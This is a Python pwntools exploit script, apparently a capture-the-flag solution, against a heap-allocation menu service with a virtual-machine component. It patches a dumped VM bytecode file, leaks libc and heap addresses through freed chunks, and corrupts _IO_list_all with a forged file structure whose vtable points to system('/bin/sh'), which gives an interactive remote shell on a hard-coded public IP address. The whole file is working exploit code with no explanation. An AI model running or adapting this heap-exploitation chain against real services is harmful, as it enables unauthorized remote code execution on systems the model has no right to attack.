#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "34.236.229.208"
port = 9999
r = remote(host,port)


def alloc(size):
    r.recvuntil(":")
    r.send("1")
    r.recvuntil(":")
    r.send(p16(size))

def update_host(idx,data):
    r.recvuntil(":")
    r.send("5")
    r.recvuntil(":")
    r.send(p16(len(data)))
    r.recvuntil(":")
    r.send(p8(idx))
    r.recvuntil(":")
    r.send(data)

def update(idx,data):
    r.recvuntil(":")
    r.send("2")
    r.recvuntil(":")
    r.send(p8(idx))
    r.recvuntil(":")
    r.send(data)



def alloc_host(size):
    r.recvuntil(":")
    r.send("4")
    r.recvuntil(":")
    r.send(p16(size))


def free():
    r.recvuntil(":")
    r.send("3")

def free_host(idx):
    r.recvuntil(":")
    r.send("6")
    r.recvuntil(":")
    r.send(p8(idx))

f = open("./dumpcode","r")
vmcode = f.read()
f.close()

alloc_host(0x80) #0
alloc_host(0x80) #1
alloc_host(0x80) #2
alloc_host(0x80) #3
for i in range(0xb):
    alloc(0x1000)

modifycode = vmcode[:8] + p16(0x4000) +vmcode[10:0x6e] + "\x98"  + vmcode[0x6f:0x1a4] + "\x02" + vmcode[0x1a5:0x1e3] + "\x01" + vmcode[0x1e4:]

alloc(len(modifycode))

update(0xb,modifycode)
free_host(0)
free_host(2)
update_host(0,"a"*16)
data = r.recvuntil("\n")
libc = u64(data[:8]) - 0x3c4b78
print "libc:",hex(libc)
heap = u64(data[8:16]) - 0x120 
print hex(heap)
modifycode = vmcode[:8] + p16(0x4000) +vmcode[10:0x6e] + "\x98"  + vmcode[0x6f:0x1a4] + "\x01" + vmcode[0x1a5:0x1e3] + "\x01" + vmcode[0x1e4:]
for i in range(0xb):
    alloc(0x1000)

alloc(len(modifycode))
update(0xb,modifycode)
free_host(1)
free_host(3)

alloc_host(0x100) #4
alloc_host(0x80) #5
update_host(4,"\x00"*0x88 + p64(0x61) + "\x00"*0x58 + p64(0x21))
free_host(1)
alloc_host(0x400) #6
alloc_host(0x80) #7
alloc_host(0x80) #8
free_host(7)
io_list = libc + 0x3c5520
update_host(7,"\x00"*8 + p64(io_list-0x10))
vtable = heap+ 0x10
system = libc + 0x45390
update_host(4,"\x00"*0x80 + "/bin/sh\x00" + p64(0x61) + p64(0)*2 + p64(1) + p64(2))
update_host(2,p64(0)*7 + p64(vtable))
update_host(0,p64(system)*4)
alloc_host(0x90) #9

r.interactive()



